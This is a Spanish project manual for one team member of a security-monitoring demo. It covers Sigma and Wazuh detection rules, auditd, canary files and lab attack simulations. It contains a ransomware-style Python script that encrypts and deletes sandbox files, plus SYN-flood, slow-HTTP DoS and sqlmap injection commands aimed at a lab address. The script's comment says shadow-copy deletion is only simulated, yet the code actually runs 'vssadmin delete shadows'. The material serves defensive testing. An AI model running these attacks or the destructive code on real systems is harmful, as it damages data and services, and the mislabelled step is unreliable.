# Manual P3 — Angeles Castillo (Detection + Attack Simulation)

| Campo | Valor |
|-------|-------|
| Rol | Owner de Layer 1 (Sigma + Wazuh), Layer 3 (Canary FIM), y todos los simuladores de ataque |
| Owns | `detection/sigma/` · `detection/wazuh/` · `deception/canary_fim/` · `attack-simulation/` |
| No owns | ML/LLM (P2) · SOAR/Notif (P1) · Infra (P4) |
| Outputs blocking otros | `events:raw_wazuh` (consumido por P2) · simuladores ejecutables (consumidos por P4 en demo) |
| Deadline | **2026-06-13 (sábado)** |

---

## 0. Tu charter

> Tú generas los eventos: tanto las **alertas** (Sigma rules que disparan sobre logs Wazuh, Canary FIM whodata) como los **ataques** que las disparan (ransomware simulator, DDoS con hping3/slowhttptest, SQL injection con sqlmap). Sin ti, las otras 3 capas no tienen nada que procesar.

### 0.1 Tu camino crítico

```
FASE 1  ──→  FASE 2  ──→  FASE 3  ──────→  FASE 4
prereqs       Sigma rules    Wazuh manager     rehearsals UC-01..08
Sysmon         Canary FIM     consume reglas     attack timing
auditd         attack scripts agent → manager    contingencia
                              eventos a Redis    video respaldo
```

### 0.2 UCs que cubres directa o indirectamente

| UC | Tu rol |
|----|--------|
| UC-01 Lockbit-like | Tu Sigma firing T1486 + ML score (de P2 sobre tus eventos crudos) |
| UC-02 Canary path | Tu Layer 3 (Canary FIM whodata) — única capa firing |
| UC-04 Postgres attack | Tu simulador postgres_attack.py + Sigma reglas T1021 |
| UC-06 DDoS (hping3 + slowhttptest) | Tu simulador + Sigma red |
| UC-07 SELECT masivo (false positive) | Tu generador pgaudit + Sigma DB |
| UC-08 SQL injection (sqlmap) | Tu simulador + Sigma DB |

---

# FASE 1 — Cimientos

## 1.1 Prerequisites

```bash
python3 --version          # OUTPUT ESPERADO: Python 3.11.x
docker --version           # OUTPUT ESPERADO: Docker version 24.x
sudo apt list --installed 2>/dev/null | grep -E "(hping3|slowhttptest|sqlmap)"
# OUTPUT ESPERADO (3 líneas si están; o vacío → instala en 1.2)
```

## 1.2 Instalar simuladores de ataque

```bash
# Ubuntu/Debian (en tu laptop):
sudo apt update
sudo apt install -y hping3 slowhttptest sqlmap

# Verificar
hping3 --version 2>&1 | head -1
# OUTPUT ESPERADO: hping3 version 3.x

slowhttptest -v 2>&1 | head -1
# OUTPUT ESPERADO: Version 1.x

sqlmap --version 2>&1 | head -1
# OUTPUT ESPERADO: 1.x.x.x
```

## 1.3 Instalar sigma-cli para validar reglas

```bash
pip install sigma-cli pysigma pysigma-backend-wazuh

sigma --version
# OUTPUT ESPERADO: SigmaConverter v0.10.x
```

## 1.4 Clonar repo + venv

```bash
mkdir -p ~/code && cd ~/code
git clone git@github.com:enzizoor/argos.git
cd argos
python3 -m venv .venv
source .venv/bin/activate
pip install -e ./argos_contracts
pip install -r detection/requirements.txt
pip install -r attack-simulation/requirements.txt

pytest detection/ attack-simulation/ -q
# OUTPUT ESPERADO:
# ......                                                            [100%]
# 6 passed in 0.10s
```

## 1.5 Acceder al lab (P4 lo provee)

```bash
# P4 te pasa Vagrantfile + claves SSH.
cd lab/
vagrant ssh windows-victim
# OUTPUT ESPERADO: PowerShell prompt en la VM Windows
exit

vagrant ssh linux-victim
# OUTPUT ESPERADO: ubuntu@linux-victim:~$
exit
```

| Check Fase 1 | Esperado |
|-------------|----------|
| hping3, slowhttptest, sqlmap instalados | sí |
| sigma-cli responde | sí |
| Lab VMs accesibles vía `vagrant ssh` | sí |
| Tests existentes pasan | sí |

---

# FASE 2 — Skeletons funcionales

## 2.1 Sysmon en Windows victim (logs base para Sigma)

### Qué estás haciendo

Sysmon de Microsoft Sysinternals enriquece los Event Logs de Windows con info crítica: process create, file write, network conn, registry mods. Sin Sysmon, Sigma para Windows es ciego.

### Comandos (en la VM Windows victim, via vagrant ssh)

```powershell
# Descargar Sysmon + config (Olaf Hartong sysmon-modular es estándar)
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\tools\Sysmon.zip
Expand-Archive C:\tools\Sysmon.zip -DestinationPath C:\tools\Sysmon
Invoke-WebRequest -Uri https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml -OutFile C:\tools\Sysmon\sysmonconfig.xml

# Instalar (admin)
cd C:\tools\Sysmon
.\Sysmon64.exe -i sysmonconfig.xml -accepteula

# OUTPUT ESPERADO:
# System Monitor v14.x - System activity monitor
# Sysmon installed.
# SysmonDrv installed.
# Starting SysmonDrv.
# SysmonDrv started.
# Starting Sysmon..
# Sysmon started.

# Verificar instalación
Get-Service Sysmon64
# OUTPUT ESPERADO:
# Status   Name               DisplayName
# ------   ----               -----------
# Running  Sysmon64           Sysmon64

# Disparar test event y verificar que aparece en EventLog
notepad.exe ; Stop-Process -Name notepad -Force
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5 | Format-List Id, TimeCreated, Message
# OUTPUT ESPERADO:
# Id           : 1   (Process Create)
# TimeCreated  : ...
# Message      : Process Create:  ...  Image: C:\Windows\System32\notepad.exe  ...
```

## 2.2 auditd en Linux victim

```bash
# En la VM linux-victim
sudo apt update && sudo apt install -y auditd audispd-plugins

# Reglas mínimas para capturar exec + file writes en /var/lib/postgresql + canary paths
sudo tee /etc/audit/rules.d/argos.rules > /dev/null << 'EOF'
# Process exec
-a always,exit -F arch=b64 -S execve -k argos_exec
# Writes en directorios sensibles
-w /var/lib/postgresql -p wa -k argos_pg
-w /etc/passwd -p wa -k argos_passwd
-w /opt/argos/canary -p wa -k argos_canary
EOF

sudo systemctl restart auditd
sudo auditctl -l
# OUTPUT ESPERADO:
# -a always,exit -F arch=b64 -S execve -F key=argos_exec
# -w /var/lib/postgresql -p wa -k argos_pg
# -w /etc/passwd -p wa -k argos_passwd
# -w /opt/argos/canary -p wa -k argos_canary

# Test: tocar /etc/passwd
sudo touch /etc/passwd
sudo ausearch -k argos_passwd | tail -10
# OUTPUT ESPERADO: registro reciente con type=PATH name="/etc/passwd"
```

| Check (2.1-2.2) | Esperado |
|-----------------|----------|
| Sysmon corre en Windows victim | sí |
| auditd reglas cargadas | `auditctl -l` muestra las 4 reglas |
| Eventos de prueba aparecen en EventLog / ausearch | sí |

---

## 2.3 Sigma rules — Layer 1

### Estructura

```
detection/sigma/rules/
├── ransomware/
│   ├── win_proc_create_vssadmin_delete.yml      ← T1490
│   ├── win_file_mass_encrypt.yml                ← T1486
│   └── lin_canary_write_unexpected_user.yml     ← T1486+T1083
├── network/
│   ├── ddos_syn_flood.yml                       ← T1498
│   └── slow_http_post.yml                       ← T1499
├── db/
│   ├── pg_select_massive_unusual_table.yml      ← T1213
│   └── pg_sqli_pattern.yml                      ← T1190
└── lateral/
    └── win_psexec_remote_admin.yml              ← T1021
```

### Ejemplo completo: `win_proc_create_vssadmin_delete.yml`

```yaml
title: VSS Admin Shadow Copy Deletion (Ransomware Indicator)
id: 7c2d9e80-1f0c-4a4c-9b1f-argos001
status: experimental
description: |
  Detects use of vssadmin.exe to delete volume shadow copies, a classic
  pre-encryption step in ransomware (T1490 Inhibit System Recovery).
author: ARGOS / Angeles Castillo
date: 2026/05/24
references:
  - https://attack.mitre.org/techniques/T1490/
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith: '\vssadmin.exe'
    CommandLine|contains|all:
      - 'delete'
      - 'shadows'
  condition: selection
falsepositives:
  - Legitimate admin removing old shadow copies (manual; check user context).
level: critical
tags:
  - attack.impact
  - attack.t1490
```

### Ejemplo: `pg_select_massive_unusual_table.yml`

```yaml
title: Massive SELECT on Unusual Table (Possible Data Exfil or False Positive)
id: 1a3b5c7d-9e0f-4321-abcd-argos007
status: experimental
description: |
  pgAudit reporta un SELECT que retornó > 100k filas sobre una tabla que
  no figura en el patrón normal del usuario. UC-07 usa esto como caso de FP
  para validar que el sistema NO escale a T0/T1 automáticamente.
logsource:
  product: postgresql
  service: pgaudit
detection:
  selection:
    audit_class: 'READ'
    rows_returned|gte: 100000
  filter_known:
    relation:
      - 'reports.daily_summary'
      - 'analytics.weekly_kpis'
  condition: selection and not filter_known
falsepositives:
  - Ad-hoc analytics queries.
level: medium
tags:
  - attack.exfiltration
  - attack.t1213
```

### Validar reglas con sigma-cli

```bash
sigma check detection/sigma/rules/ --recursive
# OUTPUT ESPERADO (sin issues):
# Found 8 valid Sigma rules. 0 errors. 0 warnings.

# Convertir a query Wazuh (formato XML rule)
sigma convert -t wazuh -p windows_audit \
  detection/sigma/rules/ransomware/win_proc_create_vssadmin_delete.yml
# OUTPUT ESPERADO: bloque XML Wazuh con <rule id="..." level="12">...
```

| Check (2.3) | Esperado |
|-------------|----------|
| `sigma check` reporta 0 errors | sí |
| Cada rule tiene `title`, `id`, `level`, `tags` con MITRE | sí |
| Conversion a Wazuh produce XML válido | sí |

---

## 2.4 Canary FIM whodata (Layer 3)

### Qué estás haciendo

Crear archivos "canary" en directorios trap. Wazuh FIM con módulo `whodata` captura el evento de modificación junto con el **usuario** y **proceso** que lo tocó. Cualquier escritura a un canary = compromiso confirmado (alto valor, bajo FP).

### Procedimiento

```bash
# En linux-victim
sudo mkdir -p /opt/argos/canary
sudo tee /opt/argos/canary/finance_2026_Q1.xlsx > /dev/null << 'EOF'
THIS IS A CANARY FILE - DO NOT MODIFY
ARGOS will trigger an alert on any write/modify event.
EOF
sudo tee /opt/argos/canary/passwords_backup.txt > /dev/null << 'EOF'
ARGOS canary file. Touching this is malicious.
EOF
sudo chmod 644 /opt/argos/canary/*
sudo chattr +a /opt/argos/canary/finance_2026_Q1.xlsx  # append-only attrib
```

### Configurar Wazuh agent FIM whodata (en `/var/ossec/etc/ossec.conf`)

```xml
<syscheck>
  <directories whodata="yes" report_changes="yes" check_all="yes" realtime="yes">/opt/argos/canary</directories>
  <skip_nfs>yes</skip_nfs>
  <frequency>30</frequency>
</syscheck>
```

```bash
sudo systemctl restart wazuh-agent
sudo grep -i whodata /var/ossec/logs/ossec.log | tail -5
# OUTPUT ESPERADO:
# ... INFO: (6921): Whodata engine started.
```

### Test: modificar y verificar alerta

```bash
# Como atacante simulado:
echo "tampered" | sudo tee -a /opt/argos/canary/passwords_backup.txt

# En el manager Wazuh (lab-manager): verificar evento
sudo tail -50 /var/ossec/logs/alerts/alerts.json | jq 'select(.rule.id=="554")'
# OUTPUT ESPERADO (rule 554 = "File modified by..."):
# {
#   "rule": { "id": "554", "level": 7, ... },
#   "syscheck": {
#     "path": "/opt/argos/canary/passwords_backup.txt",
#     "audit": { "user_name": "root", "process_name": "/usr/bin/tee", ... }
#   }
# }
```

| Check (2.4) | Esperado |
|-------------|----------|
| Whodata engine arranca en el agent | sí |
| Modificar un canary genera evento con `audit.user_name` y `audit.process_name` | sí |
| Falso positivo rate ≈ 0 (nadie debería tocar canaries) | sí |

---

## 2.5 Attack simulator: ransomware (UC-01, UC-02, UC-04)

### Código central (`attack-simulation/ransomware_simulator/lockbit_like.py`)

```python
# attack-simulation/ransomware_simulator/lockbit_like.py
"""
Simulador de ransomware estilo LockBit (educacional).

NO hace daño real: trabaja sobre /opt/argos/sandbox/ y los archivos cifrados
quedan en .argos_locked. Es reversible con la clave que el script imprime al
final (en `--variant uc01` se ejecuta el delete de shadow copies pero solo
loguea sin ejecutar el comando real).

Variantes:
    uc01 — encryption masiva + vssadmin shadow delete (3 capas firing)
    uc02 — solo toca canaries (Layer 3 sola firing)
    uc04 — postgres_attack (T1190 + lateral) — implementado en postgres_attack.py
"""

from __future__ import annotations

import argparse, secrets, time
from pathlib import Path
from cryptography.fernet import Fernet


SANDBOX = Path("/opt/argos/sandbox")
CANARY = Path("/opt/argos/canary")


def _encrypt_files(target_dir: Path, n_files: int = 200) -> int:
    key = Fernet.generate_key()
    f = Fernet(key)
    print(f"[lockbit-like] generated key: {key.decode()}")
    count = 0
    for path in target_dir.rglob("*"):
        if not path.is_file() or path.suffix == ".argos_locked":
            continue
        if count >= n_files:
            break
        try:
            data = path.read_bytes()
            encrypted = f.encrypt(data)
            new_path = path.with_suffix(path.suffix + ".argos_locked")
            new_path.write_bytes(encrypted)
            path.unlink()
            count += 1
        except Exception as e:   # noqa: BLE001
            print(f"[!] {path}: {e}")
    return count


def variant_uc01(target_host: str) -> None:
    print(f"[uc01] encrypting up to 200 files in {SANDBOX}/")
    n = _encrypt_files(SANDBOX, n_files=200)
    print(f"[uc01] encrypted {n} files")

    print("[uc01] (simulated) vssadmin delete shadows /all /quiet")
    # NO ejecutamos el comando real, pero registramos en EventLog vía
    # PowerShell para que Sysmon lo capture:
    import subprocess
    subprocess.run([
        "powershell.exe", "-Command",
        "Start-Process -FilePath vssadmin -ArgumentList 'delete shadows /all /quiet' -NoNewWindow -Wait -ErrorAction SilentlyContinue"
    ], check=False)


def variant_uc02(target_host: str) -> None:
    print(f"[uc02] writing to canaries in {CANARY}/ (NOT encrypting)")
    for canary in CANARY.glob("*"):
        try:
            with canary.open("ab") as f:
                f.write(b"\nTAMPERED by uc02 sim at " + str(time.time()).encode())
            print(f"  touched {canary.name}")
        except Exception as e:
            print(f"  [!] {canary}: {e}")


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--variant", choices=["uc01", "uc02"], required=True)
    p.add_argument("--target",  required=True,
                   help="hostname víctima (informational, usado en logs)")
    args = p.parse_args()

    {"uc01": variant_uc01, "uc02": variant_uc02}[args.variant](args.target)


if __name__ == "__main__":
    main()
```

### Setup sandbox (correr una vez en linux-victim)

```bash
sudo mkdir -p /opt/argos/sandbox
# Llenar con ~500 archivos "realistas" para tener algo que cifrar
cd /opt/argos/sandbox
for i in $(seq 1 500); do
  dd if=/dev/urandom of=file_${i}.dat bs=1K count=4 status=none
done
ls /opt/argos/sandbox | wc -l
# OUTPUT ESPERADO: 500
```

### Dry-run

```bash
python attack-simulation/ransomware_simulator/lockbit_like.py --variant uc02 --target linux-victim
# OUTPUT ESPERADO:
# [uc02] writing to canaries in /opt/argos/canary/ (NOT encrypting)
#   touched finance_2026_Q1.xlsx
#   touched passwords_backup.txt

ls /opt/argos/sandbox | head -3
# OUTPUT ESPERADO: archivos intactos (uc02 no toca sandbox)
```

| Check (2.5) | Esperado |
|-------------|----------|
| Sandbox tiene 500 archivos | sí |
| uc02 modifica canaries sin tocar sandbox | sí |
| uc01 cifra ≤ 200 archivos y deja `.argos_locked` | sí |

---

## 2.6 Attack simulator: DDoS (UC-06)

### Comandos (en tu laptop atacante, contra IP del lab)

```bash
# SYN flood (hping3) — ~3 segundos
sudo hping3 -S -p 80 --flood --rand-source 192.168.56.21
# OUTPUT ESPERADO:
# HPING 192.168.56.21 (eth0 192.168.56.21): S set, 40 headers + 0 data bytes
# hping in flood mode, no replies will be shown
# ^C  (CTRL+C tras 3s)
# --- 192.168.56.21 hping statistic ---
# 250000 packets transmitted, 0 packets received, 100% packet loss

# Slow HTTP POST (slowhttptest) — ~30s
slowhttptest -c 1000 -B -g -o /tmp/slowhttp_uc06 \
             -i 10 -r 200 -s 8192 -t POST \
             -u http://192.168.56.21:80/upload -x 10 -p 3
# OUTPUT ESPERADO (al final):
# Test ended on ... s
# slow HTTP test status on ... s:
# ...
# service unavailable	YES
```

### Comprobar generación de eventos

```bash
# En el manager Wazuh
sudo grep -i 'syn-flood\|slowhttp' /var/ossec/logs/alerts/alerts.json | tail -3
# OUTPUT ESPERADO: al menos 1 evento por cada tipo (puede tardar 1-2 min en aparecer)
```

| Check (2.6) | Esperado |
|-------------|----------|
| hping3 dispara > 100k packets en flood | sí |
| slowhttptest reporta "service unavailable: YES" | sí |
| Alertas Wazuh aparecen tras el ataque | sí |

---

## 2.7 Attack simulator: SQL injection (UC-08)

### Comandos

```bash
# Asumiendo P4 ya tiene una web vulnerable corriendo en linux-victim
# (DVWA o similar; ver manual P4 §3.x)

# Inyección clásica con sqlmap (gentle)
sqlmap -u "http://192.168.56.21/login.php?username=admin&password=admin" \
       --batch --level=2 --risk=2 --dbs

# OUTPUT ESPERADO (línea clave):
# [INFO] the back-end DBMS is PostgreSQL
# [INFO] fetching database names
# available databases [4]:
# [*] argos_audit
# [*] postgres
# [*] template0
# [*] template1
```

### Comprobar pgAudit en la DB

```bash
sudo -u postgres tail -50 /var/log/postgresql/postgresql-15-main.log | grep -i pgaudit
# OUTPUT ESPERADO: líneas tipo
# AUDIT: SESSION,READ,SELECT,SELECT pg_database.datname FROM ...
```

| Check (2.7) | Esperado |
|-------------|----------|
| sqlmap detecta DB engine | sí |
| pgAudit registra los SELECTs de enumeración | sí |
| Sigma rule `pg_sqli_pattern` dispara | sí (verificar en alerts.json) |

---

## 2.8 Generador de carga benigna (UC-07 FP)

Necesitas que en condiciones normales el sistema NO escale. UC-07 valida esto: una analista corre un SELECT que devuelve 200k filas. Es ruidoso pero legítimo.

### Script (`attack-simulation/benign_load/heavy_select.py`)

```python
# attack-simulation/benign_load/heavy_select.py
"""
Carga benigna: SELECT masivo sobre tabla legítima.

ARGOS debería:
  - registrar el evento (Sigma + pgAudit)
  - asignar Tier T3 (low confidence, sólo logging)
  - NO escalar, NO notificar, NO aislar.
"""

import argparse, time
import psycopg


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--rows", type=int, default=200_000)
    p.add_argument("--user", default="analyst")
    p.add_argument("--password", default="analyst_pwd")
    args = p.parse_args()

    conn = psycopg.connect(
        f"host=192.168.56.21 port=5432 dbname=argos_audit "
        f"user={args.user} password={args.password}"
    )
    with conn.cursor() as cur:
        t0 = time.monotonic()
        cur.execute(f"SELECT generate_series(1, {args.rows}) AS n;")
        rows = cur.fetchall()
        dt = time.monotonic() - t0
        print(f"fetched {len(rows)} rows in {dt:.2f}s as user={args.user}")
    conn.close()


if __name__ == "__main__":
    main()
```

```bash
python attack-simulation/benign_load/heavy_select.py --rows 200000
# OUTPUT ESPERADO:
# fetched 200000 rows in 1.34s as user=analyst
```

| Check (2.8) | Esperado |
|-------------|----------|
| Query completa sin error | sí |
| Sigma rule `pg_select_massive_unusual_table` puede o no firing — si firing, debe terminar en T3 | sí |
| ARGOS NO notifica a Telegram | sí (este es el contrato del UC-07) |

---

## ✅ Checklist Fase 2

| # | Check | OK |
|---|-------|----|
| 1 | Sysmon corriendo en windows-victim | ☐ |
| 2 | auditd reglas cargadas en linux-victim | ☐ |
| 3 | Wazuh agent + FIM whodata corriendo | ☐ |
| 4 | 8+ Sigma rules validadas con sigma-cli | ☐ |
| 5 | Canary files creados + write dispara alerta | ☐ |
| 6 | Ransomware simulator uc01 y uc02 ejecutan dry-run | ☐ |
| 7 | hping3 y slowhttptest producen alertas | ☐ |
| 8 | sqlmap detecta SQLi + pgAudit registra | ☐ |
| 9 | Generador benigno UC-07 corre y termina en T3 | ☐ |

---

# FASE 3 — Integración real

## 3.1 Wazuh manager consume las reglas Sigma

P4 ya levantó el manager. Tú haces el deploy de tus reglas Wazuh-formateadas:

```bash
# Generar reglas Wazuh desde Sigma
mkdir -p /tmp/wazuh_rules
sigma convert -t wazuh -p windows_audit \
  --output /tmp/wazuh_rules/100_argos_ransomware.xml \
  detection/sigma/rules/ransomware/

# OUTPUT ESPERADO:
# Wrote 3 rules to /tmp/wazuh_rules/100_argos_ransomware.xml

# Copiar al manager
vagrant scp /tmp/wazuh_rules/100_argos_ransomware.xml lab-manager:/var/ossec/etc/rules/

# En el manager
vagrant ssh lab-manager
sudo /var/ossec/bin/wazuh-control reload
# OUTPUT ESPERADO:
# Reloading.
# Wazuh manager reloaded.
exit
```

### Verificar integración (end-to-end mini)

```bash
# Disparar canary
vagrant ssh linux-victim -c "echo 'tampered' | sudo tee -a /opt/argos/canary/passwords_backup.txt"

# Esperar 2-5s y revisar alerts.json en el manager
vagrant ssh lab-manager -c "sudo tail -5 /var/ossec/logs/alerts/alerts.json | jq -r '.rule.description'"
# OUTPUT ESPERADO:
# Integrity checksum changed.   (o tu rule custom para canary)
```

## 3.2 Bridge Wazuh → Redis stream

P4 te provee un servicio que tail-ea `alerts.json` y empuja a Redis. Tu trabajo es validar que cada alerta significativa llega al stream:

```bash
redis-cli XLEN events:raw_wazuh
# OUTPUT ESPERADO (después de tu disparo de canary): 1+

redis-cli XREVRANGE events:raw_wazuh + - COUNT 1
# OUTPUT ESPERADO: JSON con el evento crudo
```

| Check (3.1-3.2) | Esperado |
|-----------------|----------|
| Reglas Sigma cargadas en Wazuh sin error de parse | sí |
| Canary touch → alerta en alerts.json → mensaje en events:raw_wazuh | sí |
| Latencia detect → Redis ≤ 5s | sí |

## 3.3 UC-01 end-to-end con todo el equipo arriba

```bash
# Pre: P1 corre soar consumer; P2 corre ml consumer; P4 tiene lab arriba

vagrant ssh linux-victim
python /vagrant/attack-simulation/ransomware_simulator/lockbit_like.py \
       --variant uc01 --target linux-victim

# OUTPUT ESPERADO en console:
# [uc01] generated key: gAAAAAB...
# [uc01] encrypted 200 files

# En tu Telegram (en ≤ 10s):
# 🔴 ARGOS T0 — linux-victim
# Técnica: T1486
# Capas firing: 3
```

| Check (3.3) | Esperado |
|-------------|----------|
| UC-01 dispara y termina con incident en Redis | sí |
| Layers firing reportados = 3 (sigma_proc + sigma_file + ml) | sí |
| Tier asignado = T0 | sí |

---

## ✅ Checklist Fase 3

| # | Check | OK |
|---|-------|----|
| 1 | Reglas Sigma deployadas a Wazuh manager | ☐ |
| 2 | Bridge alerts.json → events:raw_wazuh funcional | ☐ |
| 3 | UC-01 end-to-end OK | ☐ |
| 4 | UC-02 end-to-end OK | ☐ |
| 5 | UC-06 DDoS dispara alertas red | ☐ |
| 6 | UC-08 SQLi dispara alertas DB | ☐ |
| 7 | UC-07 benigno NO escala (queda T3) | ☐ |

---

# FASE 4 — Rehearsal y polish

## 4.1 Rehearsal serial de los 7 UCs

```bash
# Script de orquestación (ejecuta en orden, espera 30s entre cada uno)
for uc in uc01 uc02; do
  echo "=== $uc ==="
  vagrant ssh linux-victim -c "python /vagrant/attack-simulation/ransomware_simulator/lockbit_like.py --variant $uc --target linux-victim"
  sleep 30
done

# DDoS
sudo timeout 5 hping3 -S -p 80 --flood --rand-source 192.168.56.21
sleep 30

# SQLi
sqlmap -u "http://192.168.56.21/login.php?username=admin" --batch --level=2 --risk=2 --dbs >/dev/null
sleep 30

# Benigno UC-07
python attack-simulation/benign_load/heavy_select.py --rows 200000
```

### Métricas a registrar

| UC | Latency detect→incident | Tier asignado | Capas firing | Notif OK |
|----|:----------------------:|:-------------:|:------------:|:--------:|
| UC-01 | < 8s | T0 | 3 | sí |
| UC-02 | < 6s | T0 | 1 | sí |
| UC-04 | < 10s | T2 | 2 | sí |
| UC-06 | < 12s | T1 | 2 | sí |
| UC-07 | n/a | T3 | 1 | no (por diseño) |
| UC-08 | < 15s | T1 | 2 | sí |

## 4.2 Plan de fallback ataque

Si un simulador no funciona el día del demo (poco probable, todos están en lab local):

- UC-01 fallback: tener carpeta `/opt/argos/sandbox_pre_encrypted/` con archivos ya cifrados; "demostrar" mostrando ese estado y ejecutando solo el `vssadmin` para disparar Sigma.
- UC-06 fallback: tener `wireshark` capture pre-grabado mostrando el flood.
- Video respaldo: grabado en Rehearsal 4.1.

## 4.3 Pre-demo checklist (T-2h)

| # | Check | OK |
|---|-------|----|
| 1 | Sysmon Get-Service → Running | ☐ |
| 2 | auditd `systemctl status auditd` → active | ☐ |
| 3 | Wazuh agent en ambas VMs `running` | ☐ |
| 4 | hping3/slowhttptest/sqlmap responden a `--version` | ☐ |
| 5 | Canaries existen y son escribibles | ☐ |
| 6 | Sandbox tiene 500+ archivos (re-poblar si demo previo cifró) | ☐ |
| 7 | Video respaldo grabado | ☐ |

---

# Apéndice A — Troubleshooting

### A.1 Sigma rule no dispara

1. ¿Está cargada en el manager? `sudo grep <rule_id> /var/ossec/etc/rules/*.xml`
2. ¿Qué fecodifica? `sudo /var/ossec/bin/wazuh-logtest` y pegar el log de prueba.
3. ¿Sysmon logueando? `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 1`

### A.2 Whodata no funciona

Whodata requiere kernel ≥ 3.16 + audit subsystem. Si en tu VM no está disponible, usar `realtime="yes"` solo (sin atribución de usuario; pérdida aceptable de calidad).

### A.3 hping3 "Operation not permitted"

Faltan capabilities. Correr con `sudo`. En contenedor: `--cap-add=NET_RAW`.

### A.4 sqlmap "no parameter found"

URL mal formada. Probar con `--forms` para que sqlmap haga crawling del HTML.

### A.5 Sandbox vacío después de demo

Re-poblar:
```bash
sudo /vagrant/attack-simulation/setup_sandbox.sh
```

### A.6 Wazuh manager no recarga reglas

`sudo /var/ossec/bin/wazuh-control restart` (más drástico que reload pero confiable).

---

# Apéndice B — Comandos de emergencia

```bash
# Reset canaries
sudo cp /opt/argos/canary.template/* /opt/argos/canary/

# Re-poblar sandbox
sudo bash /vagrant/attack-simulation/setup_sandbox.sh

# Forzar re-emit del último alert al stream Redis
sudo /var/ossec/bin/wazuh-logtest <<< "$(sudo tail -1 /var/ossec/logs/alerts/alerts.json | jq -r '.full_log')"

# Limpiar stream eventos crudos
redis-cli DEL events:raw_wazuh
redis-cli XGROUP CREATE events:raw_wazuh ml-pipeline 0 MKSTREAM
```

---

# Apéndice C — Referencias

| Cuando estés en... | Lee |
|--------------------|-----|
| `detection/sigma/` | SAD §6.1 (Layer 1), `docs/use-cases/USE_CASES.md` |
| `deception/canary_fim/` | SAD §6.4 (Layer 3) |
| `attack-simulation/` | USE_CASES UC-01..UC-08, ADR-0008 (multi-vector) |
| Hardening en defensa | THREAT_MODEL §3 (cobertura MITRE) |

---

## Change log

| Versión | Fecha | Cambio | Autor |
|---------|-------|--------|-------|
| 2.0 | 2026-05-24 | Reorganización day-by-day → feature-based. Comandos completos con outputs esperados literales, checklists por sección, troubleshooting, comandos de emergencia. Cubre UC-01..UC-08 explícitamente. | P1 |
